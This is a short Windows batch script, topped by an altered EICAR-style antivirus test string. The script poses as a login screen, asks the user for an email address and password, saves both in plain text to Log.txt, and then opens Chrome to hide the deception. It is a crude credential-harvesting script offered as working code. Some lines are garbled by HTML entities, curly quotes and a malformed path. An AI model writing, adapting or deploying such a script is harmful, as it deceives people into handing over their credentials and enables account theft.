X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-VARIANT2-ANTIVIRUS-TEST-FILE!$H+H*

@echo off
color a
title Login
cls
echo Please Enter Your Email Address And Password
echo.
echo.
rem md C:\logs
rem echo %date% &gt;&gt; Log.txt
echo %date% Log.txt
set /p user=Username:
set /p pass=Password:
echo %date% Username=”%user%” Password=”%pass%”  > Log.txt
pause
rem start &gt;&gt;Program Here&lt;&lt;
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe";
cd “C:Logs”
exit
